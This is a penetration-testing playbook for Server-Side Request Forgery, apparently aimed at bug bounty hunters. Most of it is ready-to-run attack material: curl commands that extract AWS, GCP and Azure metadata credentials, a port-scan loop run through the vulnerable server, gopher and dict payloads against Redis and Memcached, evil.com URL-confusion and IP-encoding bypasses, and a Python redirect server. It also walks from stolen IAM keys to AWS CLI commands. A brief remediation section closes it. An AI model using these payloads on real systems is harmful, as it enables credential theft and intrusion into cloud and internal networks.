# SSRF (Server-Side Request Forgery) Playbook

**Category:** Injection / Server-Side
**Typical Severity:** High–Critical
**CVSS Range:** 7.5–10.0
**CWE:** CWE-918 (Server-Side Request Forgery)

---

## Overview

SSRF allows attackers to cause the server to make HTTP requests to arbitrary destinations — including internal services, cloud metadata endpoints, and localhost. In cloud environments (AWS, GCP, Azure), SSRF is often Critical because it enables stealing IAM credentials from the metadata service, which leads to full cloud account compromise.

SSRF is particularly valuable because:
- Internal services often lack authentication (trusting that they're not externally reachable)
- Cloud metadata APIs return IAM credentials, SSH keys, and secrets
- It can bypass firewall rules by pivoting through the application server

---

## Real-World Impact

- **AWS metadata SSRF**: `http://169.254.169.254/latest/meta-data/iam/security-credentials/` → IAM keys → full AWS account compromise
- **Internal port scanning**: Map internal network topology
- **Internal service access**: Redis (no-auth dump), Elasticsearch (unauthenticated queries), internal admin panels
- **SSRF → RCE**: Via Redis SSRF (set cron via `SLAVEOF`), or via protocol smuggling
- **Read local files**: `file:///etc/passwd` if `file://` protocol is allowed
- **Kubernetes SSRF**: `http://kubernetes.default.svc.cluster.local` for API server access

---

## Recon Methodology

### Step 1 — Find SSRF sink parameters

```bash
# Look for any parameter that accepts a URL or domain
# Common parameter names:
url=, link=, src=, source=, href=, dest=, redirect=, uri=, path=,
fetch=, load=, proxy=, callback=, return=, next=, image=, avatar=,
webhook=, notify_url=, target=, host=, server=, to=, from=

# Also look for:
# - PDF/screenshot generation endpoints
# - Image import/upload by URL
# - Webhook configuration
# - RSS/feed readers
# - Import from URL features
# - OAuth callback configuration
# - Integrations (Slack, GitHub, custom webhook URL)
```

### Step 2 — Test external callback first

```bash
# Use a Burp Collaborator, interactserver.io, or webhook.site
# This confirms the server makes outbound requests
curl "https://target.com/api/preview?url=https://your-collaborator.oastify.com/ssrf-test"

# If you get a callback → SSRF confirmed
```

### Step 3 — Test cloud metadata

```bash
# AWS
?url=http://169.254.169.254/latest/meta-data/
?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

# GCP
?url=http://metadata.google.internal/computeMetadata/v1/
?url=http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token

# Azure
?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01

# AWS IMDSv2 (newer, requires PUT first — but some apps proxy for you)
?url=http://169.254.169.254/latest/api/token  # first get token via PUT
```

---

## Testing Methodology

### Test 1 — Basic SSRF Confirmation

```bash
# External callback
curl "https://target.com/fetch?url=http://collaborator.burp.com/"

# Localhost
curl "https://target.com/fetch?url=http://localhost/"
curl "https://target.com/fetch?url=http://127.0.0.1/"
curl "https://target.com/fetch?url=http://[::1]/"
```

### Test 2 — Cloud Metadata (Highest Impact)

```bash
# AWS EC2 Instance Metadata
curl "https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/"
curl "https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
# If role name returned, fetch credentials:
curl "https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME"

# Returned creds format:
# {"AccessKeyId":"ASIA...","SecretAccessKey":"...","Token":"...","Expiration":"..."}

# GCP — requires Metadata-Flavor: Google header (may be auto-added by app)
curl "https://target.com/fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
```

### Test 3 — Internal Network Enumeration

```bash
# Common internal services to probe
http://localhost:6379/     # Redis
http://localhost:9200/     # Elasticsearch
http://localhost:8080/     # Internal web app
http://localhost:2375/     # Docker API (no auth)
http://localhost:3306/     # MySQL
http://10.0.0.1/           # Internal gateway
http://192.168.1.1/        # Internal router
http://kubernetes.default.svc.cluster.local/  # Kubernetes API

# Port scan via SSRF
for port in 22 80 443 6379 9200 8080 8443 2375; do
  echo -n "Port $port: "
  curl -s --max-time 2 "https://target.com/fetch?url=http://localhost:$port/" | head -5
done
```

### Test 4 — Protocol Bypass

```bash
# When http/https filtering is in place
?url=dict://localhost:11211/stats          # Memcached
?url=gopher://localhost:6379/_INFO%0d%0a   # Redis via Gopher
?url=file:///etc/passwd                    # Local file read
?url=ftp://internal-ftp-server/

# DNS rebinding (bypass IP allowlisting)
# Register a domain that resolves to 169.254.169.254 after first request
# Use rbndr.us or make.cm for DNS rebinding testing
```

### Test 5 — IP Address Bypass Filters

```bash
# Bypass 127.0.0.1 filtering
http://127.0.1
http://0.0.0.0
http://2130706433/       # Decimal IP of 127.0.0.1
http://0x7f000001/       # Hex IP
http://0177.0.0.1/       # Octal
http://[::1]/            # IPv6 localhost
http://[::ffff:127.0.0.1]/  # IPv6-mapped

# Bypass 169.254.169.254 filtering
http://169.254.169.254/         # Direct
http://0xa9fea9fe/              # Hex
http://2852039166/              # Decimal
http://[::ffff:169.254.169.254]/  # IPv6-mapped
http://0251.0376.0251.0376/     # Octal

# URL confusion
http://evil.com#@169.254.169.254/
http://169.254.169.254.evil.com/  # if DNS resolves to 169.254.169.254
```

### Test 6 — SSRF via Redirect Chain

```bash
# Host a redirect on your server
# evil.com/redirect → 302 → http://169.254.169.254/

# Python redirect server
python3 -c "
from http.server import HTTPServer, BaseHTTPRequestHandler
class H(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(302)
        self.send_header('Location', 'http://169.254.169.254/latest/meta-data/')
        self.end_headers()
HTTPServer(('0.0.0.0', 8080), H).serve_forever()
"
```

---

## Common Endpoints to Test

| Feature | Parameter | Target |
|---|---|---|
| Image import by URL | `?imageUrl=` | Metadata + internal |
| PDF/screenshot generator | `?url=` | Internal services |
| Webhook configuration | `webhook_url=` | SSRF on trigger |
| URL preview/unfurl | `?preview_url=` | Metadata |
| Import from URL | `?source=` | Internal + file:// |
| Avatar upload by URL | `?avatar_url=` | Metadata |
| OAuth redirect | `redirect_uri=` | SSRF in some implementations |
| Custom integration URL | `endpoint_url=` | Internal services |
| Health check URL | `?check_url=` | Internal |

---

## Payload Examples

### AWS Metadata Full Chain

```
1. GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
Response: "RoleName"

2. GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/RoleName
Response: {"AccessKeyId":"ASIA...","SecretAccessKey":"xxx","Token":"yyy","Expiration":"..."}

3. Configure AWS CLI with stolen credentials:
AWS_ACCESS_KEY_ID=ASIA...
AWS_SECRET_ACCESS_KEY=xxx
AWS_SESSION_TOKEN=yyy

4. Access AWS resources:
aws s3 ls
aws secretsmanager list-secrets
aws iam list-users
```

---

## Automation Ideas

```bash
# SSRFmap — automated SSRF exploitation
python3 ssrfmap.py -r request.txt -p url -m readfiles,portscan

# Interactsh (self-hosted collaborator)
interactsh-client -v  # start listener
# Use provided URL in SSRF payloads

# nuclei SSRF templates
nuclei -u https://target.com -t ssrf/ -c 50

# ffuf — discover SSRF-prone endpoints
ffuf -u "https://target.com/FUZZ?url=https://collaborator.url/" \
  -w api_endpoints.txt -mc 200
```

---

## Real Bug Bounty Examples

### Example 1 — Capital One Data Breach ($0 bounty, $80M fine)
SSRF on a WAF misconfiguration allowed attacker to reach AWS metadata service, steal IAM credentials, and exfiltrate 100M credit card records from S3.

### Example 2 — GitLab ($20,300)
SSRF via the Kubernetes integration allowed reading cloud metadata and internal Kubernetes API server. Full internal network access.

### Example 3 — Shopify ($25,000)
SSRF via the "Import from URL" product feature. Attacker used DNS rebinding to bypass IP checks and reach AWS metadata service.

---

## Remediation

```python
# Input validation — allowlist over blocklist
import ipaddress, socket
from urllib.parse import urlparse

ALLOWED_SCHEMES = {'https', 'http'}
BLOCKED_RANGES = [
    ipaddress.ip_network('169.254.0.0/16'),  # Link-local / metadata
    ipaddress.ip_network('127.0.0.0/8'),     # Loopback
    ipaddress.ip_network('10.0.0.0/8'),      # Private
    ipaddress.ip_network('172.16.0.0/12'),   # Private
    ipaddress.ip_network('192.168.0.0/16'),  # Private
]

def is_safe_url(url):
    parsed = urlparse(url)
    if parsed.scheme not in ALLOWED_SCHEMES:
        return False
    ip = ipaddress.ip_address(socket.gethostbyname(parsed.hostname))
    return not any(ip in r for r in BLOCKED_RANGES)
```

Also: enable AWS IMDSv2 (requires PUT token request before GET), disable unused metadata routes, use separate egress rules for application servers.
